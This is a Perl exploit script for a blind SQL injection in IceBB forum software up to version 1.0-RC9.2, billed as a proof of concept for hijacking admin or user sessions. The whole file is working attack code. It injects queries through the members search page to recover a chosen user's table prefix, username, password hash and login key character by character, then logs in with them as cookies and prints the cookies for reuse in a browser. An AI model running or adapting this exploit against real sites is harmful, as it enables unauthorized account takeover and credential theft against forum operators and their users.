###############################  Perl Exploit Start #############################


#!/usr/bin/perl
# IceBB <= 1.0-RC9.2 Blind SQL Injection
# Admin/User's Session Hijacking PoC
# Coded by __GiReX__

use LWP::UserAgent;
 
if(not defined $ARGV[1])
{
	banner();
	print "[+] Usage:\tperl  $0  <host>  <path>  [id]\n";
	print "[+] Example:\tperl  $0  localhost  /icebb/ 1\n";
	exit;
}

my $target  =  ($ARGV[0] =~ /^http:\/\//) ?  $ARGV[0].$ARGV[1]:  'http://' . $ARGV[0].$ARGV[1];
my $id  =  (defined $ARGV[2]) ? $ARGV[2]: 1;  

my $lwp =  new LWP::UserAgent;
my @cset  =  (48..57, 97..102); 

my ($hash, $key, $user, $prefix) =  (undef, undef, undef, undef);      

banner();
$user = get_username();
$prefix =  get_prefix();

print STDOUT "[+] User $id username: $user\n";
	
for(my $j = 1; $j <= 32; $j++)
{  
    foreach $char(@cset)
    {	
		info(chr($char), $hash, "password");
		$rv = check_char($char, $j, "password");	
	
         	if(defined $rv)
	     	{		
	         	$hash .= chr($char);
	         	last;
	     	}
    }
	
    last if $j > 2 and not defined $hash;
}	

if(not defined $hash or length($hash) != 32)
{
	print STDOUT "\n\n[-] Exploit mistake: probably fixed\n";
	exit;
}
else
{
	print STDOUT "\n" x 1; 
}

for(my $j = 1; $j <= 32; $j++)
{  
    foreach $char(@cset)
    {	
	  info(chr($char), $key, "loginkey");
	  $rv = check_char($char, $j, "login_key");	
	
          if(defined $rv)
	  {		
	       $key .= chr($char);
	       last;
	  }
    }
	
    last if $j > 2 and not defined $key;
}

if(not defined $key or length($key) != 32)
{
     print STDOUT "\n\n[-] Exploit mistake: user $id has not a login_key\n";
     exit;
}

print "\n\n[+] Attempting to login with user's $id session...\n\n";

$logged = try_login();

if(defined $logged) 
{
	print STDOUT "[+] Oh yeah logged in!\n\n";
	print STDOUT "[+] Try yourself with your browser and these cookies:\n\n";
	print STDOUT "[+] Cookie: ${prefix}user=${user}; ${prefix}pass=${hash}; \n".
			 "            ${prefix}uid=${id}; ${prefix}login_key=${key}\n\n";
}
else
{
	print STDOUT "[-] Attempt failed...\n\n";
}

print STDOUT "[+] Exploit terminated\n";


sub try_login()
{
   my $lwp = new LWP::UserAgent;
      $lwp->default_header('Cookie' => "${prefix}user=${user}; ${prefix}pass=${hash}; ${prefix}uid=${id}; ${prefix}login_key=${key}"); 
	  
	  my $res = $lwp->get($target);
	  
	  if($res->is_success)
	  {
		  if($res->content =~ /User Control Panel/)
		  {
			    return 1;
		  }
	  }
	
  return undef;
}

sub info
{
  my($c, $cur, $str)  =  @_;
	
	$cur = '' unless defined $cur;
	print  STDOUT "[+] User $id ${str}: ${cur}${c}\r";
	
  $| = 1; 
}

sub check_char
{
  my ($char, $n, $field)  =  @_ ;
   
    my $res = $lwp->get($target."index.php?act=members&username=%5c&url=".
			        "OR+ASCII(SUBSTRING((SELECT+${field}+FROM+${prefix}users+WHERE+id=${id}),${n},1))=${char}%23");
		
	if($res->is_success)
    	{
		if($res->content !~ /No members were found that met your selected critera/ and $res->content =~ /<h2>Member list<\/h2>/)
		{
			 return $res->is_success; 	 
		}
	}
	
  return undef;
}

sub get_prefix()
{
  my $rv = "icebb";
  
	my $res = $lwp->get($target."index.php?act=members&username=%5c&url=OR+1");
	
	if($res->content =~ /as total FROM ([a-z]+)_users WHERE/)
	{
		$rv = $1;
	}
	
  return $rv . '_';
}

sub get_username()
{  
  my $rv = undef;
  my $res = $lwp->get($target."index.php?profile=${id}");
	
	if($res->is_success)
	{
		if($res->content =~ /<h2>View profile: (.+)<\/h2>/)
		{
			$rv = $1;
		}
		else
		{
			die "[-] Exploit mistake: user ${id} does not exists\n";
		}
	}
	else
	{
		die "[-] Exploit mistake: could not connect to $target\n";
	}
	
  return $rv;
 }

sub banner
{
    print "\n";
    print "[+] IceBB <= 1.0-RC9.2 Blind SQL Injection\n";
    print "[+] Admin/User's Session Hijacking PoC\n";
    print "[+] Coded by __GiReX__\n";
    print "\n\n";
}

